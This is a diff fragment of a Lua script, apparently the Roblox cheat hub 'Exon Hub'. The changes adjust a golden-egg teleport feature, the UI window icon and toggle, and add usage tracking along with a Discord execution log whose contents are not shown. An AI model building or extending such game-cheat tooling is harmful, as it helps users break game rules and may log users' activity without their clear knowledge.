+				local bPos = getEggPosition(b)
+				return aPos.X < bPos.X or (aPos.X == bPos.X and aPos.Z < bPos.Z)
 			end)
 
-			local unique = {}
-			local seen = {}
-			for _, egg in ipairs(eggs) do
-				if not seen[egg] then
-					seen[egg] = true
-					table.insert(unique, egg)
-				end
-			end
-
-			return unique
+			return eggs
 		end
 
 		function H.teleportToNextGoldenEgg()
 			local eggs = H.getGoldenEggInstances()
 			if #eggs == 0 then
-				H.setStatus("Golden Egg: none found")
+				H.setStatus("Golden Egg: none in workspace")
 				return false
 			end
 
@@ -1981,6 +2876,12 @@
 			end
 
 			local egg = eggs[S.goldenEggTpIndex]
+			if not egg or not egg.Parent then
+				S.goldenEggTpInitialized = false
+				S.goldenEggTpCount = 0
+				return H.teleportToNextGoldenEgg()
+			end
+
 			local standCFrame = H.getGoldenEggStandCFrame(egg)
 			if not standCFrame then
 				H.setStatus("Golden Egg: no position")
@@ -2009,7 +2910,7 @@
 
 			section:Button({
 				Title = "Teleport to Golden Egg",
-				Desc = "First click picks random egg, then cycles through the rest",
+				Desc = "Scans workspace for Egg, TP to one, then cycles through the rest",
 				Callback = function()
 					H.teleportToNextGoldenEgg()
 				end,
@@ -5863,15 +6764,19 @@
 			local Window = WindUI:CreateWindow({
 				Title = "Exon Hub",
 				Folder = "ExonHub",
-				Icon = "solar:home-2-bold",
+				Icon = EXONHUB_ICON_ASSET,
+				IconSize = EXONHUB_TOPBAR_ICON_SIZE,
+				IconThemed = false,
 				NewElements = true,
 				ToggleKey = Enum.KeyCode.LeftAlt,
 				OpenButton = {
-					Title = "Exon Hub",
-					Enabled = true,
-					Draggable = true,
+					Enabled = false,
 				},
 			})
+
+			UI.window = Window
+			H.applyExonHubWindowIcon(Window)
+			H.createExonHubFloatingToggle(Window)
 
 			local MainSection = Window:Section({
 				Title = "Main",
@@ -7299,9 +8204,10 @@
 		H.setAutoDeleteSkins = H.setAutoDeleteSkinsImpl
 
 		local ok, err = pcall(function()
-			H.sendDiscordExecuteLog()
+			H.initUsageTracking()
 			H.createUI()
 			print("[ExonHub] UI created")
+			H.sendDiscordExecuteLog()
 
 			H.setAntiAfk(true, false)
 
